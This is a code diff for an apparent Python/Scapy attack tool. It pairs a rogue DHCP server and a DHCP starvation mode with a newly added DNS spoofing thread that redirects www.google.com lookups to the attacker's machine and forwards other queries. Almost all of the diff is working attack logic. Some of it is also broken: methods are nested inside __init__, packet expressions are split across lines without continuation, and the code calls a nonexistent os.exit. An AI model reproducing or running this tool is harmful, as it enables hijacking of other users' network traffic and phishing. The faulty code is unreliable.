@@ -13,6 +13,12 @@ end_ip = "192.168.1.200"
 netmask = "255.255.255.0"
 starve = False
 
+dns = False
+domain = "www.google.com"
+target = "123.123.123.2"
+
+threadPool = []
+
 def checkArgs():
 	global interface, start_ip, end_ip, netmask
 
@@ -22,16 +28,36 @@ def checkArgs():
 	parser.add_argument("end", help="DHCP end IP")
 	parser.add_argument("netmask", help="DHCP netmask")
 	parser.add_argument("-s", "--starve", action="store_true", help="Sends DISCOVER packets to deplete existing DHCP server's pool")
+	parser.add_argument("-d", "--domain", dest="domain", help="DNS domain to spoof")
+	parser.add_argument("-t", "--target", dest="target", help="DNS IP to direct to")
+
 	args = parser.parse_args()
 	interface = args.interface
 	start_ip = args.start
 	end_ip = args.end
 	netmask = args.netmask
-	starve = args.starve
+	
+	if args.starve != None:
+		starve = args.starve
+
+	if args.domain != None and args.target != None:
+		domain = args.domain
+		target = args.target
+		dns = True
 
 	if atol(start_ip) > atol(end_ip):
 		print "err: start ip is larger than end ip"
 		sys.exit(2)
+
+def sig_handler(signal, frame):
+	print "Ending program"
+	
+	i = 0
+	for t in threadPool:
+		t.kill = True
+		print "Waiting for Thread %d to die" %i
+		i += 1
+	os.exit(0)
 
 class dhcp_starve(threading.Thread):
 	def __init__(self):
@@ -106,9 +132,11 @@ class dhcp_server(threading.Thread):
 
 	def run(self):
 		"""Main thread function"""
-		print "running DHCP server on", self.myMAC, ":", self.myIP
-		print "sniffing..."
-		sniff(filter=self.filter,prn=self.detect_parserDhcp,store=0,iface=self.iface)
+
+		while not self.kill:
+			print "running DHCP server on", self.myMAC, ":", self.myIP
+			print "sniffing..."
+			sniff(filter=self.filter, prn=self.detect_parserDhcp, store=0, iface=self.iface)
 
 	def detect_parserDhcp(self, pkt):
 		"""
@@ -248,8 +276,58 @@ class dhcp_server(threading.Thread):
 	def num2ip(self,ip_num):
 		return ".".join(map(lambda n: str(ip_num>>n & 0xFF), [24,16,8,0]))
 
+class DNS_server(threading.Thread):
+	def __init__(self, **kwargs):
+		threading.Thread.__init__(self)
+		
+		self.myIP = get_if_addr(interface)
+		self.filter = "udp port 53 and ip dst " + self.myIP
+		self.kill = False
+
+		def run(self):
+			while not self.kill:
+				sniff(filter=self.filter, prn=detect_dns, iface=interface)
+
+		def parser_args(self,**kwargs):
+		"""Sets keyword arguments into attributes"""
+			for key, value in kwargs.items():
+				print "setting attribute",key, ":",value
+				setattr(self, key, value)
+
+		def detect_dns(self, pkt):
+			if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
+
+				if "www.google.com" in str(pkt["DNS Question Record"].qname):
+					spf_resp = IP(dst=pkt[IP].src)/
+							   UDP(dport=pkt[UDP].sport, sport=53)/
+							   DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.myIP)/
+							   DNSRR(rrname="www.google.com",rdata=self.myIP))
+
+					sendp(spf_resp, iface=interface)
+					print "Sent spoofed response to %s" % pkt[IP].src
+
+				else:
+					print "Forwarding" + pkt[DNSQR].qname
+
+					response = sr1(
+						IP(dst='8.8.8.8')/
+						UDP(sport=pkt[UDP].sport)/
+						DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
+						verbose=0,
+					)
+
+					resp_pkt = IP(dst=pkt[IP].src, src=self.myIP)/
+							   UDP(dport=pkt[UDP].sport)/
+							   DNS()
+					resp_pkt[DNS] = response[DNS]
+
+					sendp(resp_pkt, iface=interface, verbose=0)
+
+					print "Responding to %s" % pkt[IP].src
+
 if __name__ == "__main__":
 	checkArgs()
+	signal.signal(signal.SIGINT, sig_handler)
 
 	kargs = {
 		"iface": interface,
@@ -266,9 +344,12 @@ if __name__ == "__main__":
 		t.kill = True
 		print "Stopping DHCP starvation"
 	
-	try:
-		t=dhcp_server(**kargs)
+	
+	t = dhcp_server(**kargs)
+	t.start()
+	threadPool.append(t)
+
+	if dns:
+		t = DNS_server()
 		t.start()
-		
-	except KeyboardInterrupt:
-		os._exit(0)
+		threadPool.append(t)
